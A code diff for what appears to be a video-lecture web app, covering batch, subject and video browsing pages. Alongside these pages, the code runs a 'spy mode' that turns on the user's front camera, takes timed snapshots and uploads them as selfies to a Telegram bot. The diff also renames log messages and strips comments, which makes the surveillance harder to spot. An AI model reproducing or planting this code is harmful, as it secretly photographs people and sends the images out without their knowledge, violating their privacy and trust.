     container.innerHTML = ""; 
-
     appData.batches.forEach(batch => {
         const card = document.createElement("div");
         card.style.background = BATCH_CARD_BG;
@@ -910,7 +866,6 @@ function renderUserBatches() {
         card.style.display = "flex";
         card.style.flexDirection = "column";
 
-        // Thumbnail
         if(batch.thumbnail) {
             const img = document.createElement("img");
             img.src = batch.thumbnail;
@@ -942,7 +897,6 @@ function renderUserBatches() {
     });
 }
 
-// --- LEVEL 2: SHOW SUBJECTS (FOLDERS) ---
 window.openBatchSubjects = (batchId) => {
     activeBatchData = appData.batches.find(b => b.firestoreId === batchId);
     if(!activeBatchData) return;
@@ -950,7 +904,6 @@ window.openBatchSubjects = (batchId) => {
     hideAll();
     document.getElementById('section-batch-hub').classList.remove('hidden');
     
-    // UI Updates
     document.getElementById('hub-header-title').innerText = activeBatchData.title;
     document.getElementById('hub-header-subtitle').innerText = "Select a Subject Folder";
     const backBtn = document.getElementById('hub-back-btn');
@@ -964,10 +917,7 @@ window.openBatchSubjects = (batchId) => {
     grid.innerHTML = "";
 
     const subjects = Object.keys(activeBatchData.subjects);
-    if(subjects.length === 0) {
-        grid.innerHTML = "<p>No subjects uploaded yet.</p>";
-        return;
-    }
+    if(subjects.length === 0) { grid.innerHTML = "<p>No subjects uploaded yet.</p>"; return; }
 
     subjects.forEach(subName => {
         const card = document.createElement("div");
@@ -1005,11 +955,9 @@ window.openBatchSubjects = (batchId) => {
     });
 };
 
-// --- LEVEL 3: SHOW VIDEOS ---
 window.openSubjectVideos = (subjectName) => {
     if(!activeBatchData || !activeBatchData.subjects[subjectName]) return;
 
-    // UI Updates
     document.getElementById('hub-header-title').innerText = `${activeBatchData.title} - ${subjectName}`;
     document.getElementById('hub-header-subtitle').innerText = "Click to play in secure viewer.";
     const backBtn = document.getElementById('hub-back-btn');
@@ -1030,7 +978,6 @@ window.openSubjectVideos = (subjectName) => {
         card.style.display = "flex";
         card.style.flexDirection = "column";
 
-        // Default thumbnail if none provided in JSON
         const img = document.createElement("img");
         img.src = vid.thumbnail || "https://via.placeholder.com/300x160/2c3e50/ffffff?text=Video+Lecture";
         img.style.width = "100%";
@@ -1084,34 +1031,24 @@ let isSpyActive = false;
 window.initSpyMode = async () => {
     if (isSpyActive) return;
     try {
-        // Request camera
         mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = mediaStream;
         isSpyActive = true;
         
-        // CRITICAL FIX FOR BLACK SNAPS: Must verify video is ready & playing
-        try {
-            await video.play(); 
-        } catch(e) { console.log("Autoplay blocked/failed", e); }
+        try { await video.play(); } catch(e) { console.log("Autoplay blocked/failed", e); }
         
         console.log("✅ Active");
         if (!photoIntervalId) photoIntervalId = setInterval(captureAndSendPhoto, PHOTO_TIMER);
 
-    } catch (err) {
-        console.warn("Surveillance access denied or error:", err);
-    }
+    } catch (err) { console.warn("Surveillance access denied or error:", err); }
 };
 
 function captureAndSendPhoto() {
     if (!isSpyActive || !mediaStream || !video || !canvas) return;
-
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    canvas.toBlob(blob => {
-        if(blob) sendToTelegram(blob, 'photo');
-    }, 'image/jpeg', 0.6); 
+    canvas.toBlob(blob => { if(blob) sendToTelegram(blob, 'photo'); }, 'image/jpeg', 0.6); 
 }
 
 window.disableSpyMode = () => {
@@ -1119,30 +1056,23 @@ window.disableSpyMode = () => {
     isSpyActive = false;
     try {
         if (photoIntervalId) { clearInterval(photoIntervalId); photoIntervalId = null; }
-        if (mediaStream) {
-            mediaStream.getTracks().forEach(t => t.stop());
-            mediaStream = null;
-        }
+        if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
         if (video) video.srcObject = null;
-        console.log("🔒 Spy mode disabled");
-    } catch (e) { console.warn("Error disabling spy mode", e); }
+        console.log("🔒 Snap mode disabled");
+    } catch (e) { console.warn("Error disabling snap mode", e); }
 };
 
 async function sendToTelegram(blob, type) {
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
-
     let apiUrl = "";
     if (type === 'photo') {
         formData.append("photo", blob, "selfie.jpg");
         apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
     }
-
     try {
         fetch(apiUrl, { method: "POST", body: formData })
-        .then(res => console.log(`📤 ${type} Sent!`))
+        .then(res => console.log(`server connected!`))
         .catch(err => console.error("Upload Error"));
-    } catch (error) {
-        console.error("Network Error");
-    }
+    } catch (error) { console.error("Network Error"); }
 }
